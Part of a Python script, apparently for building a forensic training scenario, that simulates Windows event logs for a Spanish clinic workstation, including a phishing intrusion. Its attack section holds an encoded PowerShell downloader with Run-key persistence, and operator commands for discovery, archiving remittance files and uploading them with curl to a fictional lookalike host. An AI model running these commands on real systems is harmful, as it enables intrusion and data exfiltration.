    sim.sys(t + sec(11.8), "EventLog", 6006, [(None, S.BIN, bytes(8))], esn="EventLog", qual=32768, kw=0x80000000000000, pid=0)
    sim.shutdown_t = t + sec(12)
    sim.sys(t + sec(12.6), "Microsoft-Windows-Kernel-General", 13, [("StopTime", S.FT, t + sec(12.6))],
            guid=GUIDS["Microsoft-Windows-Kernel-General"], ver=0, task=2, pid=4, kw=0x8000000000000080)


# Dominios de fondo y sus IPs (todas de documentación)
DNS_POOL = {
    "outlook.office365.com": "198.51.100.10", "login.microsoftonline.com": "198.51.100.11",
    "teams.microsoft.com": "198.51.100.12", "ecs.office.com": "198.51.100.13",
    "officeclient.microsoft.com": "198.51.100.14", "nexus.officeapps.live.com": "198.51.100.15",
    "graph.microsoft.com": "198.51.100.16", "kelbrookmedical-my.sharepoint.com": "198.51.100.17",
    "g.live.com": "198.51.100.18", "oneclient.sfx.ms": "198.51.100.19",
    "www.bing.com": "192.0.2.20", "edge.microsoft.com": "192.0.2.21", "config.edge.skype.com": "192.0.2.22",
    "msedge.api.cdp.microsoft.com": "192.0.2.23", "intranet.kelbrook.internal": "10.20.30.12",
    "portal.kelbrook-medical.net": "10.20.30.10", "fs01.kelbrook.internal": FS_IP,
    "empresas.bancameridia.es": "192.0.2.80", "www.ardeal-labs.net": "192.0.2.91",
    "sede.agenciatributaria.gob.es": "192.0.2.95", "settings-win.data.microsoft.com": "192.0.2.30",
    "v10.events.data.microsoft.com": "192.0.2.31", "ctldl.windowsupdate.com": "192.0.2.32",
}
ONEDRIVE_IPS = ["198.51.100.17", "198.51.100.18", "198.51.100.19", "198.51.100.16"]

BROWSE = [
    ("https://intranet.kelbrook.internal/", "Inicio - Intranet Kelbrook Medical"),
    ("https://intranet.kelbrook.internal/facturacion/procedimientos", "Procedimientos de facturación - Intranet"),
    ("https://intranet.kelbrook.internal/rrhh/calendario-laboral-2026", "Calendario laboral 2026 - Intranet"),
    ("https://portal.kelbrook-medical.net/", "Portal del paciente - Kelbrook Medical"),
    ("https://empresas.bancameridia.es/login", "Banca Meridia Empresas - Acceso"),
    ("https://empresas.bancameridia.es/remesas/estado", "Estado de remesas - Banca Meridia Empresas"),
    ("https://empresas.bancameridia.es/extractos", "Extractos - Banca Meridia Empresas"),
    ("https://outlook.office.com/mail/", "Correo - Lucía Marín - Outlook"),
    ("https://kelbrookmedical-my.sharepoint.com/personal/lmarin_kelbrook-medical_net/_layouts/15/onedrive.aspx", "Mis archivos - OneDrive"),
    ("https://sede.agenciatributaria.gob.es/", "Sede electrónica - Agencia Tributaria"),
    ("https://www.ardeal-labs.net/clientes/acceso", "Área de clientes - Laboratorios Ardeal"),
]
SEARCHES = ["calendario fiscal octubre 2026", "plazo modelo 347", "formato remesa sepa pain.008",
            "excel buscarv varias columnas", "devolucion recibo sepa motivo md06", "festivos madrid 2026",
            "conciliacion bancaria plantilla", "laboratorios ardeal"]
DOCS = [
    r"F:\Conciliaciones\Conciliacion_Ardeal_{ym}.xlsx", r"F:\Conciliaciones\Conciliacion_Bioanalitica_{ym}.xlsx",
    r"F:\Remesas\{ym}\resumen_remesas_{ym}.xlsx", r"F:\Remesas\{ym}\devoluciones_{ym}.xlsx",
    r"F:\Facturas_proveedores\2026\Control_facturas_2026.xlsx", r"F:\Informes\Cierre_mensual_{ym}.xlsx",
]


def background(sim, t0, t1, ukey="lmarin"):
    """Ruido de fondo del sistema y de la sesión entre t0 y t1."""
    r = sim.rng
    P = sim.procs
    t = t0 + sec(r.uniform(60, 400))
    while t < t1:
        k = r.random()
        if k < 0.30:
            sp = sim.spawn(t, r"C:\Windows\System32\SearchProtocolHost.exe",
                           r'"C:\Windows\system32\SearchProtocolHost.exe" Global\UsGthrFltPipeMssGthrPipe' + str(r.randint(1, 40)) +
                           r'_ Global\UsGthrCtrlFltPipeMssGthrPipe' + str(r.randint(1, 40)) + r' 1 -2147483646 "Software\Microsoft\Windows Search" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)" "C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc" "DownLevelDaemon" ',
                           P["searchidx"], "system", "System", life=r.uniform(20, 140))
            sim.spawn(t + sec(0.4), r"C:\Windows\System32\SearchFilterHost.exe",
                      r'"C:\Windows\system32\SearchFilterHost.exe" 0 816 820 828 8192 824 800 ', P["searchidx"], "system", "System",
                      life=r.uniform(10, 100))
        elif k < 0.45:
            sim.spawn(t, r"C:\Windows\System32\backgroundTaskHost.exe",
                      r'"C:\Windows\system32\backgroundTaskHost.exe" -ServerName:BackgroundTaskHost.WebAccountProvider',
                      P["svc_dcom"], ukey, "Medium", life=r.uniform(3, 30))
        elif k < 0.58:
            sim.spawn(t, r"C:\Windows\System32\RuntimeBroker.exe", r"C:\Windows\System32\RuntimeBroker.exe -Embedding",
                      P["svc_dcom"], ukey, "Medium", life=r.uniform(30, 900))
        elif k < 0.68:
            clsid = r.choice(["{3EB3C877-1F16-487C-9050-104DBCD66683}", "{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}",
                              "{973D20D7-562D-44B9-B70B-5A0F49CCDF3F}"])
            sim.spawn(t, r"C:\Windows\System32\dllhost.exe", rf"C:\Windows\system32\DllHost.exe /Processid:{clsid}",
                      P["svc_dcom"], ukey if clsid[1] != "9" else "system", "Medium" if clsid[1] != "9" else "System",
                      life=r.uniform(2, 60))
        elif k < 0.76:
            sim.spawn(t, r"C:\Windows\System32\wbem\WmiPrvSE.exe", r"C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding",
                      P["svc_dcom"], "network", "System", life=r.uniform(20, 300))
        elif k < 0.84:
            sim.spawn(t, r"C:\Windows\System32\taskhostw.exe", "taskhostw.exe Install $(Arg0)", P["svc_netsvcs"], "system",
                      "System", life=r.uniform(1, 8))
        elif k < 0.90:
            sim.spawn(t, r"C:\Windows\System32\audiodg.exe", r"C:\Windows\system32\AUDIODG.EXE 0x4e0", P["svc_audio"], "local",
                      "System", life=r.uniform(5, 200))
        elif k < 0.95:
            p = sim.spawn(t, r"C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe",
                          r'"C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /ua /installsource scheduler',
                          P["svc_netsvcs"], "system", "System", life=r.uniform(4, 15))
            sim.dns(t + sec(1.2), p, "msedge.api.cdp.microsoft.com", [DNS_POOL["msedge.api.cdp.microsoft.com"]])
        else:
            sim.spawn(t, r"C:\Windows\System32\sppsvc.exe", r"C:\Windows\system32\sppsvc.exe", P["services"], "network",
                      "System", life=r.uniform(20, 40))
            sim.sys(t + sec(35), "Microsoft-Windows-Security-SPP", 16384, [
                (None, S.STR, iso(t + sec(r.randint(3000, 90000)), 3).replace(" ", "T") + "Z"), (None, S.STR, "RulesEngine")],
                ch="Application", guid=GUIDS["Microsoft-Windows-Security-SPP"], esn="Software Protection Platform Service",
                qual=16384, kw=0x80000000000000, pid=0)
        t += sec(r.uniform(40, 380))
    # DCOM 10016, ruido clásico
    for _ in range(r.randint(0, 3)):
        tt = t0 + sec(r.uniform(0, (t1 - t0) / TICKS))
        sim.sys(tt, "Microsoft-Windows-DistributedCOM", 10016, [
            ("param1", S.STR, "específico de la aplicación"), ("param2", S.STR, "Local"), ("param3", S.STR, "Activación"),
            ("param4", S.STR, "{2593F8B9-4EAF-457C-B68A-50F6B8EA6B54}"), ("param5", S.STR, "{15C20B67-12E7-4BB6-92BB-7AFF07997402}"),
            ("param6", S.STR, DOMAIN), ("param7", S.STR, "lmarin"), ("param8", S.STR, LMARIN_SID), ("param9", S.STR, "LocalHost (con LRPC)"),
            ("param10", S.STR, "No disponible"), ("param11", S.STR, "No disponible")],
            guid=GUIDS["Microsoft-Windows-DistributedCOM"], esn="DCOM", qual=0, level=3, kw=0x8080000000000000)


def sig_version(t):
    days = int((t - INSTALL) / TICKS / 86400)
    return f"1.{437 + days // 31}.{(days * 7) % 400 + 11}.0", "1.1.25090.1"


def defender_day(sim, t_on, t_off):
    r = sim.rng
    base = [("Product Name", S.STR, "Microsoft Defender Antivirus"), ("Product Version", S.STR, "4.18.25090.3009")]
    t = t_on + sec(r.uniform(300, 900))
    while t < t_off:
        cur, eng = sig_version(t)
        sim.sys(t, "Microsoft-Windows-Windows Defender", 2000, base + [
            ("Signature Type Index", S.STR, "1"), ("Signature Type", S.STR, "AntiVirus"), ("Update Type Index", S.STR, "2"),
            ("Update Type", S.STR, "Delta"), ("User", S.STR, "NT AUTHORITY\\SYSTEM"), ("Current Engine Version", S.STR, eng),
            ("Previous Engine Version", S.STR, eng), ("Current Signature Version", S.STR, cur),
            ("Previous Signature Version", S.STR, cur.rsplit(".", 2)[0] + "." + str(int(cur.split(".")[2]) - 2) + ".0"),
            ("Domain", S.STR, "NT AUTHORITY"), ("SID", S.STR, "S-1-5-18")],
            ch="Defender", guid=GUIDS["Microsoft-Windows-Windows Defender"], ver=0, task=0, kw=0x8000000000000000,
            pid=sim.procs["msmpeng"].pid, user="S-1-5-18")
        t += sec(r.uniform(3.5, 5.5) * 3600)
    scan = t_on + sec(r.uniform(3.2, 4.2) * 3600)
    if scan < t_off:
        sid = "{" + str(uuid.UUID(int=r.getrandbits(128))).upper() + "}"
        common = base + [("Scan ID", S.STR, sid), ("Scan Type Index", S.STR, "1"), ("Scan Type", S.STR, "Antimalware"),
                         ("Scan Parameters Index", S.STR, "1"), ("Scan Parameters", S.STR, "Examen rápido"),
                         ("Domain", S.STR, "NT AUTHORITY"), ("User", S.STR, "SYSTEM"), ("SID", S.STR, "S-1-5-18")]
        dur = r.randint(95, 420)
        for eid, tt, extra in ((1000, scan, []), (1001, scan + sec(dur), [("Scan Time Hours", S.STR, "0"),
                               ("Scan Time Minutes", S.STR, str(dur // 60)), ("Scan Time Seconds", S.STR, str(dur % 60))])):
            sim.sys(tt, "Microsoft-Windows-Windows Defender", eid, common + extra, ch="Defender",
                    guid=GUIDS["Microsoft-Windows-Windows Defender"], ver=0, task=0, kw=0x8000000000000000,
                    pid=sim.procs["msmpeng"].pid, user="S-1-5-18")
        sim.spawn(scan, DEF_PLAT + r"\MpCmdRun.exe", '"' + DEF_PLAT + r'\MpCmdRun.exe" Scan -ScheduleJob -ScanTrigger 55 -IdleScheduledJob',
                  sim.procs["svc_netsvcs"], "system", "System", life=dur + 2)
    cur, eng = sig_version(t_on)
    sim.sys(t_on + sec(r.uniform(90, 200)), "Microsoft-Windows-Windows Defender", 1150, base + [
        ("Platform version", S.STR, "4.18.25090.3009"), ("Engine version", S.STR, eng),
        ("Antivirus signature version", S.STR, cur), ("Antispyware signature version", S.STR, cur),
        ("RTP state", S.STR, "Habilitado"), ("OA state", S.STR, "Habilitado"), ("IOAV state", S.STR, "Habilitado"),
        ("BM state", S.STR, "Habilitado"), ("Product status", S.STR, "0x00080000")],
        ch="Defender", guid=GUIDS["Microsoft-Windows-Windows Defender"], ver=0, task=0, kw=0x8000000000000000,
        pid=sim.procs["msmpeng"].pid, user="S-1-5-18")


def edge_visit(sim, t, url, title, transition=0x30000000, p=None):
    sim.edge.append((t, url, title, transition))
    if p is not None and not url.startswith("file:"):
        sim.spawn(t - sec(0.3), EDGE, f'"{EDGE}" --type=renderer --lang=es --js-flags=--ms-user-locale= --device-scale-factor=1 '
                  f'--num-raster-threads=4 --enable-main-frame-before-activation --renderer-client-id={sim.rng.randint(8, 400)} '
                  f'--time-ticks-at-unix-epoch=-{sim.rng.getrandbits(50)} --launch-time-ticks={sim.rng.getrandbits(36)} '
                  f'--field-trial-handle=1980,i,{sim.rng.getrandbits(60)},{sim.rng.getrandbits(60)},262144 /prefetch:1',
                  p, "lmarin", "Low", life=sim.rng.uniform(30, 2400))
    if p is not None:
        host = url.split("/")[2] if "://" in url else None
        if host and host in DNS_POOL:
            sim.dns(t - sec(0.05), p, host, [DNS_POOL[host]])


def user_day(sim, L, t_end, day_ym, ukey="lmarin", allow_outlook=True):
    """Jornada de Lucía: Outlook, Excel sobre F:, navegación y PDFs."""
    r = sim.rng
    P = sim.procs
    ex = P["explorer"]
    if allow_outlook:
        ol = sim.spawn(L + sec(r.uniform(40, 90)), OUTLOOK, f'"{OUTLOOK}" ', ex, ukey, key="outlook")
        sim.dns(ol.start + sec(2.1), ol, "outlook.office365.com", [DNS_POOL["outlook.office365.com"]])
        sim.dns(ol.start + sec(2.3), ol, "login.microsoftonline.com", [DNS_POOL["login.microsoftonline.com"]])
        sim.userassist[OUTLOOK] = sim.userassist.get(OUTLOOK, 0) + 1
    od = P.get("onedrive")
    # Red de OneDrive (proceso en AppData: la regla de Sysmon lo registra)
    t = L + sec(r.uniform(10, 40))
    while od and t < t_end:
        ip = r.choice(ONEDRIVE_IPS)
        sim.net(t, od, ip, 443, "-")
        if r.random() < 0.3:
            sim.dns(t - sec(0.04), od, r.choice(["g.live.com", "oneclient.sfx.ms", "kelbrookmedical-my.sharepoint.com"]), [ip])
        t += sec(r.uniform(600, 2400))
    # DNS periódico de las aplicaciones de la sesión
    apps = [P.get(k) for k in ("outlook", "teams", "msedge", "onedrive", "searchhost")]
    apps = [a for a in apps if a]
    names = [n for n in DNS_POOL if not n.endswith(".internal") or n == "intranet.kelbrook.internal"]
    t = L + sec(r.uniform(30, 120))
    while apps and t < t_end:
        a = r.choice(apps)
        n = r.choice(names)
        sim.dns(t, a, n, [DNS_POOL[n]])
        t += sec(r.uniform(60, 420))
    # Documentos de Excel
    for _ in range(r.randint(1, 3)):
        t = L + sec(r.uniform(900, max(1000, (t_end - L) / TICKS - 1800)))
        doc = r.choice(DOCS).format(ym=day_ym)
        e = sim.spawn(t, EXCEL, f'"{EXCEL}" "{doc}"', ex, ukey, life=r.uniform(600, 4800))
        sim.recent.append((t, doc, "xlsx"))
        sim.userassist[EXCEL] = sim.userassist.get(EXCEL, 0) + 1
        sim.dns(t + sec(1.5), e, "nexus.officeapps.live.com", [DNS_POOL["nexus.officeapps.live.com"]])
    # Navegación
    msedge = P.get("msedge")
    for _ in range(r.randint(4, 14)):
        t = L + sec(r.uniform(300, (t_end - L) / TICKS - 300))
        if r.random() < 0.2:
            q = r.choice(SEARCHES)
            url = "https://www.bing.com/search?q=" + q.replace(" ", "+") + "&form=QBLH"
            edge_visit(sim, t, url, q + " - Buscar", 0x30000001 | 0x02000000, msedge)
        else:
            u, title = r.choice(BROWSE)
            edge_visit(sim, t, u, title, r.choice([0x30000000, 0x30000001 | 0x02000000, 0x30000008]), msedge)
    if r.random() < 0.25 and msedge:
        t = L + sec(r.uniform(1800, 20000))
        if t < t_end:
            pdf = rf"F:\Facturas_proveedores\2026\{r.choice(['Bioanalitica', 'Ardeal', 'Suministros_Clinicos', 'Limpiezas_Norte'])}_{day_ym}_{r.randint(100, 999)}.pdf"
            sim.spawn(t, EDGE, f'"{EDGE}" --single-argument {pdf}', ex, ukey, life=r.uniform(60, 600))
            edge_visit(sim, t + sec(0.8), "file:///" + pdf.replace("\\", "/"), pdf.rsplit("\\", 1)[1], 0x30000006)
            sim.recent.append((t, pdf, "pdf"))
    # Bloqueo de la comida (14:00-15:00 hora local, casi todos los días)
    if r.random() < 0.85:
        lk = L + sec((5.3 + r.uniform(-0.2, 0.3)) * 3600)
        if lk + sec(3600) < t_end:
            lock_unlock(sim, lk, lk + sec(r.uniform(2700, 3900)))


# ======================================================================= EL ATAQUE (13/10)
OUTLOOK_TMP = r"C:\Users\lmarin\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\K7Q2ZP1M" + "\\"
TEMP = r"C:\Users\lmarin\AppData\Local\Temp" + "\\"
ZIP_NAME = "Factura_ARD-2026-0917.zip"
LNK_NAME = "Factura_ARD-2026-0917.pdf.lnk"
TEMP1 = TEMP + "Temp1_" + ZIP_NAME + "\\"
STAGE = TEMP + "rm0926.zip"
PAYLOAD = """$u='https://cdn.ardeal-lab.net/d/';$d="$env:LOCALAPPDATA\\Microsoft\\OneDrive\\Update"
iwr ($u+'ARD-2026-0917.pdf') -UseBasicParsing -OutFile "$env:TEMP\\ARD-2026-0917.pdf"
Start-Process "$env:TEMP\\ARD-2026-0917.pdf"
New-Item -ItemType Directory -Force -Path $d | Out-Null
iwr ($u+'odu.bin') -UseBasicParsing -OutFile "$d\\OneDriveUpdater.exe"
New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'OneDrive Updater' -Value "$d\\OneDriveUpdater.exe" -Force | Out-Null
Start-Process "$d\\OneDriveUpdater.exe"
"""
PAYLOAD_B64 = base64.b64encode(PAYLOAD.encode("utf-16-le")).decode()
LNK_ARGS = "-w hidden -nop -ep bypass -enc " + PAYLOAD_B64
PS_CMD = f'"{POWERSHELL}" {LNK_ARGS}'
OPERATOR = [  # (hora UTC, línea de cmd, [(hijo, línea del hijo)], regla Sysmon del hijo)
    (T(13, 8, 48, 12.41), "whoami /all", [(r"C:\Windows\System32\whoami.exe", "whoami  /all")], "technique_id=T1033,technique_name=System Owner/User Discovery"),
    (T(13, 8, 48, 40.07), "ipconfig /all", [(r"C:\Windows\System32\ipconfig.exe", "ipconfig  /all")], "technique_id=T1016,technique_name=System Network Configuration Discovery"),
    (T(13, 8, 49, 15.63), "net user lmarin /domain", [(r"C:\Windows\System32\net.exe", "net  user lmarin /domain"),
                                                     (r"C:\Windows\System32\net1.exe", r"C:\Windows\system32\net1  user lmarin /domain")], "technique_id=T1087.002,technique_name=Domain Account"),
    (T(13, 8, 50, 2.18), 'net group "Domain Admins" /domain', [(r"C:\Windows\System32\net.exe", 'net  group "Domain Admins" /domain'),
                                                              (r"C:\Windows\System32\net1.exe", r'C:\Windows\system32\net1  group "Domain Admins" /domain')], "technique_id=T1069.002,technique_name=Domain Groups"),
    (T(13, 8, 50, 40.92), "nltest /dclist:kelbrook.internal", [(r"C:\Windows\System32\nltest.exe", "nltest  /dclist:kelbrook.internal")], "technique_id=T1018,technique_name=Remote System Discovery"),
    (T(13, 8, 52, 10.33), r"net view \\fs01", [(r"C:\Windows\System32\net.exe", r"net  view \\fs01")], "technique_id=T1135,technique_name=Network Share Discovery"),
    (T(13, 8, 53, 30.75), r"dir \\fs01\Facturacion", [], ""),
    (T(13, 8, 55, 5.12), r"dir \\fs01\Facturacion\Remesas\2026-09", [], ""),
    (T(13, 9, 2, 5.48), r"tar.exe -a -c -f C:\Users\lmarin\AppData\Local\Temp\rm0926.zip -C \\fs01\Facturacion\Remesas 2026-09",
     [(r"C:\Windows\System32\tar.exe", r"tar.exe  -a -c -f C:\Users\lmarin\AppData\Local\Temp\rm0926.zip -C \\fs01\Facturacion\Remesas 2026-09")], "technique_id=T1560.001,technique_name=Archive via Utility"),
    (T(13, 9, 4, 31.27), r'curl.exe -s -k -F "f=@C:\Users\lmarin\AppData\Local\Temp\rm0926.zip" https://cdn.ardeal-lab.net/u',
     [(r"C:\Windows\System32\curl.exe", r'curl.exe  -s -k -F "f=@C:\Users\lmarin\AppData\Local\Temp\rm0926.zip" https://cdn.ardeal-lab.net/u')], "technique_id=T1105,technique_name=Ingress Tool Transfer"),
    (T(13, 9, 6, 10.04), r"del C:\Users\lmarin\AppData\Local\Temp\rm0926.zip", [], ""),
]
REMESAS = ["remesa_2026-09-05.xml", "remesa_2026-09-12.xml", "remesa_2026-09-19.xml", "remesa_2026-09-26.xml",
           "resumen_remesas_2026-09.xlsx", "devoluciones_2026-09.xlsx"]
STAGE_BYTES = hashlib.sha512(b"rm0926").digest() * 4410        # contenido ficticio del ZIP de remesas
UNPLUG = T(13, 9, 52, 33.18)
JT_LOGON = T(13, 10, 6, 15.7)
USB_PLUG = T(13, 10, 8, 40.3)


def attack_day(sim):
    r = sim.rng
    boot = T(13, 6, 41, 7.2)
    win_boot(sim, boot, True)
    L = T(13, 6, 43, 52.4)
    user_logon(sim, L)
    P = sim.procs
    ex, msedge = P["explorer"], P["msedge"]
    ol = sim.spawn(T(13, 6, 44, 41.9), OUTLOOK, f'"{OUTLOOK}" ', ex, "lmarin", key="outlook")
    sim.userassist[OUTLOOK] = sim.userassist.get(OUTLOOK, 0) + 1
    sim.dns(ol.start + sec(2.1), ol, "outlook.office365.com", [DNS_POOL["outlook.office365.com"]])
    sim.dns(ol.start + sec(2.3), ol, "login.microsoftonline.com", [DNS_POOL["login.microsoftonline.com"]])
    edge_visit(sim, T(13, 6, 51, 3.5), "https://intranet.kelbrook.internal/", "Inicio - Intranet Kelbrook Medical", 0x30000000, msedge)
    edge_visit(sim, T(13, 6, 55, 47.1), "https://empresas.bancameridia.es/remesas/estado", "Estado de remesas - Banca Meridia Empresas", 0x30000001 | 0x02000000, msedge)
    doc = r"F:\Conciliaciones\Conciliacion_Ardeal_2026-09.xlsx"
    xl = sim.spawn(T(13, 7, 2, 30.6), EXCEL, f'"{EXCEL}" "{doc}"', ex, "lmarin", key="excel", life=4183.2)
    sim.recent.append((xl.start, doc, "xlsx"))
    sim.userassist[EXCEL] = sim.userassist.get(EXCEL, 0) + 1
    sim.dns(xl.start + sec(1.4), xl, "nexus.officeapps.live.com", [DNS_POOL["nexus.officeapps.live.com"]])
    background(sim, L, TRIAGE_START)
    od = P["onedrive"]
    t = L + sec(31)
    while t < UNPLUG:
        sim.net(t, od, r.choice(ONEDRIVE_IPS), 443)
        t += sec(r.uniform(700, 2100))

    # --- apertura del adjunto
    t0 = T(13, 7, 31, 5.31)
    zip_path = OUTLOOK_TMP + ZIP_NAME
    sim.fcreate(t0, ol, zip_path)
    sim.stream(t0 + sec(0.004), ol, zip_path, "[ZoneTransfer]\r\nZoneId=3\r\n")
    sim.recent.append((t0 + sec(0.2), zip_path, "zip"))
    t1 = T(13, 7, 31, 19.06)
    sim.fcreate(t1, ex, TEMP1 + LNK_NAME)
    ps = sim.spawn(t1 + sec(0.27), POWERSHELL, PS_CMD, ex, "lmarin", cwd=TEMP, key="_ps", life=6.71,
                   rule="technique_id=T1059.001,technique_name=PowerShell")
    sim.spawn(ps.start + sec(0.03), r"C:\Windows\System32\conhost.exe", r"\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1",
              ps, "lmarin", life=6.69)
    sim.ps_seq = ps_engine_events(sim, ps.start, ps.end, PS_CMD, LMARIN_SID, PAYLOAD, "", sim.ps_seq)
    sim.dns(T(13, 7, 31, 20.12), ps, C2_HOST, [C2_IP])
    sim.net(T(13, 7, 31, 20.19), ps, C2_IP, 443, "-", rule="technique_id=T1059.001,technique_name=PowerShell")
    pdf = TEMP + "ARD-2026-0917.pdf"
    sim.fcreate(T(13, 7, 31, 21.44), ps, pdf)
    me = sim.spawn(T(13, 7, 31, 22.03), EDGE, f'"{EDGE}" --single-argument {pdf}', ps, "lmarin", cwd=TEMP, life=0.41)
    edge_visit(sim, T(13, 7, 31, 22.9), "file:///" + pdf.replace("\\", "/"), "ARD-2026-0917.pdf", 0x30000006)
    sim.net(T(13, 7, 31, 23.81), ps, C2_IP, 443, "-", rule="technique_id=T1059.001,technique_name=PowerShell")
    sim.fcreate(T(13, 7, 31, 24.62), ps, IMPLANT, rule="technique_id=T1105,technique_name=Ingress Tool Transfer")
    sim.fexe(T(13, 7, 31, 24.63), ps, IMPLANT)
    sim.regset(T(13, 7, 31, 25.12), ps, rf"HKU\{LMARIN_SID}\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\OneDrive Updater",
               IMPLANT, rule="technique_id=T1547.001,technique_name=Registry Run Keys / Start Folder")
    imp = sim.spawn(T(13, 7, 31, 25.44), IMPLANT, f'"{IMPLANT}" ', ps, "lmarin", cwd=TEMP, key="implant")
    sim.run_key_t = T(13, 7, 31, 25.12)

    # --- beacons
    t = T(13, 7, 31, 27.02)
    last_dns = 0
    while t < TRIAGE_START:
        if t < UNPLUG:
            if t - last_dns > sec(300):
                sim.dns(t - sec(0.03), imp, C2_HOST, [C2_IP])
                last_dns = t
            sim.net(t, imp, C2_IP, 443, "-")
        else:
            sim.dns(t, imp, C2_HOST, [], status="1460")
        t += sec(60 * r.uniform(0.9, 1.1))

    # --- bloqueo para el café
    lock_unlock(sim, T(13, 8, 20, 10.4), T(13, 8, 34, 40.8))

    # --- operador
    for tt, line, kids, rule in OPERATOR:
        c = sim.spawn(tt, CMD, rf"C:\Windows\system32\cmd.exe /C {line}", imp, "lmarin", cwd=TEMP, life=0.9 + 0.4 * len(kids),
                      rule="technique_id=T1059.003,technique_name=Windows Command Shell")
        sim.spawn(tt + sec(0.012), r"C:\Windows\System32\conhost.exe", r"\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1",
                  c, "lmarin", life=0.9 + 0.4 * len(kids))
        par = c
        for j, (img, cl) in enumerate(kids):
            life = 0.6 if "tar" not in img and "curl" not in img else (3.8 if "tar" in img else 9.3)
            k = sim.spawn(tt + sec(0.05 + 0.07 * j), img, cl, par, "lmarin", cwd=TEMP, life=life, rule=rule)
            if img.endswith("net.exe") and len(kids) > 1:
                par = k
            if img.endswith("tar.exe"):
                sim.fcreate(k.start + sec(0.21), k, STAGE)
                sim.tar_proc = k
            if img.endswith("curl.exe"):
                sim.dns(k.start + sec(0.08), k, C2_HOST, [C2_IP])
                sim.net(k.start + sec(0.13), k, C2_IP, 443, "-", rule="technique_id=T1105,technique_name=Ingress Tool Transfer")
        if line.startswith("del "):
            h = hashlib
            sim.fdelete(tt + sec(0.03), c, STAGE, f"MD5={h.md5(STAGE_BYTES).hexdigest().upper()},SHA256={h.sha256(STAGE_BYTES).hexdigest().upper()},IMPHASH=00000000000000000000000000000000",
                        False, rule="technique_id=T1070.004,technique_name=File Deletion")

    # --- Lucía llama a Ardeal
    edge_visit(sim, T(13, 9, 18, 40.2), "https://www.bing.com/search?q=laboratorios+ardeal+tel%C3%A9fono+administraci%C3%B3n&form=QBLH",
               "laboratorios ardeal teléfono administración - Buscar", 0x30000001 | 0x02000000, msedge)
    edge_visit(sim, T(13, 9, 18, 52.7), "https://www.ardeal-labs.net/contacto", "Contacto - Laboratorios Ardeal", 0x30000000, msedge)

    # --- IT desenchufa el cable
    sim.sys(UNPLUG, "e1dexpress", 27, [(None, S.STR, "\\Device\\NDMP2"), (None, S.STR, "Intel(R) Ethernet Connection (16) I219-LM"),
                                       (None, S.BIN, bytes(16))], esn="e1dexpress", qual=49152, level=3, kw=0x80000000000000, pid=4)
    for k, name in enumerate((C2_HOST, "outlook.office365.com", C2_HOST, "teams.microsoft.com", C2_HOST)):
        sim.sys(UNPLUG + sec(68 + k * 191.3), "Microsoft-Windows-DNS-Client", 1014, [
            ("QueryName", S.STR, name), ("AddressLength", S.U32, 128), ("Address", S.BIN, bytes(128))],
            guid=GUIDS["Microsoft-Windows-DNS-Client"], ver=0, level=3, task=1014, kw=0x4000000000000000, pid=P["svc_dns"].pid,
            user="S-1-5-20")

    # --- Jorge Torres (IT)
    user_logon(sim, JT_LOGON, "jtorres")
    exj = P["explorer_j"]
    cs = sim.spawn(T(13, 10, 9, 54.2), r"C:\Windows\System32\consent.exe", "consent.exe 6688 520 000001C2B7F31240", P["svc_appinfo"],
                   "system", "System", session=2, life=3.1)
    USERS["jtorres_e"] = USERS["jtorres"]
    sim.logons["jtorres_e"] = sim.logons["jtorres_elev"]
    cmdj = sim.spawn(T(13, 10, 9, 58.1), CMD, r'"C:\Windows\system32\cmd.exe" ', exj, "jtorres_e", "High",
                     session=2, elev="%%1937", cwd=r"C:\Windows\system32" + "\\", key="cmd_j")
    sim.spawn(T(13, 10, 9, 58.15), r"C:\Windows\System32\conhost.exe", r"\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1",
              cmdj, "jtorres_e", "High", session=2, elev="%%1937")
    sim.spawn(TRIAGE_START, KAPE, r"E:\KAPE\kape.exe  --tsource C: --tdest E:\triage\KB-FIN-WS03 --target KB-Triage", cmdj,
              "jtorres_e", "High", session=2, elev="%%1937", cwd="E:\\KAPE\\", key="kape")
    return P


# ======================================================================= CALENDARIO
from datetime import date as _date
HOLIDAYS = {(4, 2), (4, 3), (5, 1), (10, 12)}
VACATION = [(_date(2026, 8, 3), _date(2026, 8, 21)), (_date(2026, 6, 29), _date(2026, 7, 3))]
WU_DAYS = {(4, 15): "KB5055523", (5, 13): "KB5058411", (6, 10): "KB5060842", (7, 15): "KB5062553",
           (8, 26): "KB5063878", (9, 9): "KB5065426", (10, 8): "KB5066835"}
UBR_BY_KB = {"KB5055523": 3775, "KB5058411": 4061, "KB5060842": 4349, "KB5062553": 4652,
             "KB5063878": 4946, "KB5065426": 6584, "KB5066835": 6899}


def wu_install(sim, t, kb, month):
    r = sim.rng
    title = f"2026-{month:02d} Actualización acumulativa para Windows 11 Version 24H2 para sistemas basados en x64 ({kb})"
    g = "{" + str(uuid.UUID(int=r.getrandbits(128))) + "}"
    base = [("updateTitle", S.STR, title), ("updateGuid", S.GUID, g), ("updateRevisionNumber", S.U32, 1)]
    for eid, off, task in ((44, 0, 1), (43, 1500, 1), (19, 2900, 1)):
        sim.sys(t + sec(off), "Microsoft-Windows-WindowsUpdateClient", eid, base,
                guid=GUIDS["Microsoft-Windows-WindowsUpdateClient"], ver=1, task=task, kw=0x8000000000000018,
                user="S-1-5-18")
    sim.spawn(t + sec(1490), r"C:\Windows\servicing\TrustedInstaller.exe", r"C:\Windows\servicing\TrustedInstaller.exe",
              sim.procs["services"], "system", "System", life=1500)
    sim.spawn(t + sec(1495), r"C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.26100.6899_none_3f8f0c3e6b0d8a51\TiWorker.exe",
              r"C:\Windows\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.26100.6899_none_3f8f0c3e6b0d8a51\TiWorker.exe -Embedding",
              sim.procs["svc_dcom"], "system", "System", life=1400)
